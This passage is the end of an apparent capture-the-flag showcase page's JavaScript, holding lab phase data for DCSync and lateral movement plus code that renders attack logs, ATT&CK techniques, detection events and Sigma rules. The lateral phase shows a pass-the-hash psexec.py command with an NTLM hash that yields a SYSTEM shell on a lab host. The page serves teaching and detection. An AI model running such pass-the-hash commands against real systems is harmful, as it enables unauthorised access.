          detection: 'Event ID 4662 — DS-Replication-Get-Changes-All on DC\nEvent ID 4624 — Logon Type 3 from unexpected host\nAlert: DCSync performed from non-DC machine',
          sigma: 'title: DCSync Attack Detected\ndetection:\n  replication:\n    EventID: 4662\n    Properties|contains: "DS-Replication-Get-Changes-All"\n  NOT SubjectUserName|endswith: "$"\n  condition: replication\nlevel: critical',
        },
        {
          label: 'Lateral', type: 'lateral',
          log: [
            {cls:'log-prompt', t:'kali@kali:~$ '},
            {cls:'log-cmd',    t:'psexec.py -hashes :0e0363213e37b94221497260b0bcb4fc Administrator@10.10.10.161'},
            {cls:'log-out',    t:'\n[*] Requesting shares on 10.10.10.161...'},
            {cls:'log-out',    t:'\n[*] Found writable share ADMIN$'},
            {cls:'log-out',    t:'\n[*] Uploading payload...'},
            {cls:'log-owned',  t:'\nMicrosoft Windows [Version 10.0.17763.1490]'},
            {cls:'log-owned',  t:'\nC:\\Windows\\system32> whoami'},
            {cls:'log-owned',  t:'nt authority\\system'},
          ],
          ttp: ['T1550.002 — Pass the Hash', 'T1021.002 — SMB/Windows Admin Shares'],
          detection: 'Event ID 4624 — Logon Type 3 with NTLM (no Kerberos)\nEvent ID 7045 — psexesvc.exe service created\nEvent ID 4697 — New service installed within 30s of new logon',
          sigma: 'title: Pass-the-Hash via PsExec\ndetection:\n  svc_create:\n    EventID: 7045\n    ServiceName: "PSEXESVC"\n  condition: svc_create\nlevel: critical',
        },
      ]
    },
  ];

  let activeLab = 0;
  let activePhase = 0;

  const tabsEl      = document.getElementById('ctf-tabs');
  const headerEl    = document.getElementById('ctf-player-header');
  const railEl      = document.getElementById('ctf-chain-rail');
  const logBarEl    = document.getElementById('ctf-log-bar');
  const logOutEl    = document.getElementById('ctf-log-output');
  const analysisEl  = document.getElementById('ctf-analysis-body');
  const prevBtn     = document.getElementById('ctf-prev');
  const nextBtn     = document.getElementById('ctf-next');
  const replayBtn   = document.getElementById('ctf-replay');
  const counterEl   = document.getElementById('ctf-phase-counter');
  const githubEl    = document.getElementById('ctf-github-link');

  if (!tabsEl) return;

  function diffClass(d) { return d === 'easy' ? 'tab-easy' : d === 'med' ? 'tab-med' : 'tab-hard'; }
  function diffLabel(d) { return d === 'easy' ? 'Easy' : d === 'med' ? 'Medium' : 'Hard'; }

  function buildTabs() {
    tabsEl.innerHTML = '';
    LABS.forEach(function(lab, i) {
      var btn = document.createElement('button');
      btn.className = 'ctf-tab' + (i === activeLab ? ' active' : '');
      btn.innerHTML = lab.platform + ' &mdash; ' + lab.title.split(' \u2014 ')[0] +
        ' <span class="ctf-tab-diff ' + diffClass(lab.diff) + '">' + diffLabel(lab.diff) + '</span>';
      btn.addEventListener('click', function() { activeLab = i; activePhase = 0; render(); });
      tabsEl.appendChild(btn);
    });
  }

  function buildHeader() {
    var lab = LABS[activeLab];
    headerEl.innerHTML =
      '<div class="ctf-player-meta">' +
        '<div class="ctf-player-platform">' + lab.platform + '</div>' +
        '<div class="ctf-player-title">' + lab.title + '</div>' +
        '<div class="ctf-player-desc">' + lab.desc + '</div>' +
      '</div>' +
      '<div class="ctf-player-stats">' +
        '<span class="ctf-stat-badge ' + diffClass(lab.diff) + '">' + diffLabel(lab.diff) + '</span>' +
        lab.tags.map(function(t) {
          return '<span class="attack-chip">' + t + '</span>';
        }).join('') +
      '</div>';
  }

  function buildRail() {
    var lab = LABS[activeLab];
    railEl.innerHTML = '';
    lab.phases.forEach(function(ph, i) {
      var color = PHASE_COLORS[ph.type] || '#888';
      var cls = i < activePhase ? 'done' : i === activePhase ? 'active' : '';
      var btn = document.createElement('div');
      btn.className = 'ctf-phase-btn ' + cls;
      btn.style.setProperty('--phase-color', color);
      btn.innerHTML = '<div class="ctf-phase-pip"><span class="phase-dot"></span>' + ph.label + '</div>';
      btn.addEventListener('click', function() { activePhase = i; renderPhase(); });
      railEl.appendChild(btn);
      if (i < lab.phases.length - 1) {
        var conn = document.createElement('div');
        conn.className = 'ctf-phase-conn' + (i < activePhase ? ' done' : '');
        railEl.appendChild(conn);
      }
    });
  }

  function renderPhase() {
    var lab = LABS[activeLab];
    var ph  = lab.phases[activePhase];
    var color = PHASE_COLORS[ph.type] || '#888';

    // log bar color
    logBarEl.style.setProperty('--phase-color', color);
    logBarEl.innerHTML = '<span style="color:' + color + ';font-size:9px;letter-spacing:.12em;text-transform:uppercase;">' + ph.label + ' Phase</span>';

    // log output
    logOutEl.innerHTML = '';
    ph.log.forEach(function(line, i) {
      var span = document.createElement('span');
      span.className = 'ctf-log-line ' + line.cls;
      span.style.animationDelay = (i * 60) + 'ms';
      span.textContent = line.t;
      logOutEl.appendChild(span);
    });

    // analysis
    analysisEl.innerHTML = '';

    // ATT&CK block
    var atkBlock = document.createElement('div');
    atkBlock.className = 'analysis-block';
    atkBlock.style.animationDelay = '0ms';
    atkBlock.innerHTML =
      '<div class="analysis-block-header" style="color:' + color + ';">' +
        '<span style="width:6px;height:6px;border-radius:50%;background:' + color + ';display:inline-block;flex-shrink:0;"></span>' +
        'ATT&amp;CK Techniques' +
      '</div>' +
      '<div class="analysis-block-body">' +
        ph.ttp.map(function(t) { return '<span class="attack-chip">' + t + '</span>'; }).join(' ') +
      '</div>';
    analysisEl.appendChild(atkBlock);

    // Detection block
    var detBlock = document.createElement('div');
    detBlock.className = 'analysis-block';
    detBlock.style.animationDelay = '80ms';
    var detLines = ph.detection.split('\n').map(function(l) {
      return '<span class="det-line">' + l + '</span>';
    }).join('\n');
    detBlock.innerHTML =
      '<div class="analysis-block-header" style="color:#52c97a;">' +
        '<span style="width:6px;height:6px;border-radius:50%;background:#52c97a;display:inline-block;flex-shrink:0;"></span>' +
        'Detection Opportunities' +
      '</div>' +
      '<div class="analysis-block-body" style="white-space:pre-line;">' + detLines + '</div>';
    analysisEl.appendChild(detBlock);

    // Sigma block
    var sigBlock = document.createElement('div');
    sigBlock.className = 'analysis-block sigma-block';
    sigBlock.style.animationDelay = '160ms';
    var sigmaHtml = ph.sigma
      .replace(/^(title|detection|logsource|level|condition|keywords|EventID|TargetImage|CommandLine|Image|SubjectUserName|ShareName|ServiceName|Properties|PreAuthType|TargetFilename|User|NOT)(\:)/gm,
        function(m, k, c) { return '<span class="sigma-key">' + k + '</span>' + c; })
      .replace(/(critical|high)/g, '<span class="sigma-red">$1</span>')
      .replace(/(medium)/g, '<span class="sigma-amber">$1</span>');
    sigBlock.innerHTML =
      '<div class="analysis-block-header" style="color:#6a9aff;">' +
        '<span style="width:6px;height:6px;border-radius:50%;background:#6a9aff;display:inline-block;flex-shrink:0;"></span>' +
        'Sigma Detection Rule' +
      '</div>' +
      '<div class="analysis-block-body" style="white-space:pre-line;font-size:10.5px;line-height:1.7;">' + sigmaHtml + '</div>';
    analysisEl.appendChild(sigBlock);

    // Counter + rail rebuild
    counterEl.textContent = 'Phase ' + (activePhase + 1) + ' / ' + lab.phases.length;
    buildRail();
    prevBtn.disabled = activePhase === 0;
    prevBtn.style.opacity = activePhase === 0 ? '.35' : '1';
    nextBtn.textContent = activePhase < lab.phases.length - 1 ? 'Next Phase \u2192' : 'Complete \u2713';
    nextBtn.disabled = false;
  }

  function render() {
    buildTabs();
    buildHeader();
    githubEl.href = LABS[activeLab].github;
    renderPhase();
  }

  prevBtn.addEventListener('click', function() {
    if (activePhase > 0) { activePhase--; renderPhase(); }
  });
  nextBtn.addEventListener('click', function() {
    var lab = LABS[activeLab];
    if (activePhase < lab.phases.length - 1) { activePhase++; renderPhase(); }
  });
  replayBtn.addEventListener('click', function() { activePhase = 0; renderPhase(); });

  render();

})();

</script>
</body>
</html>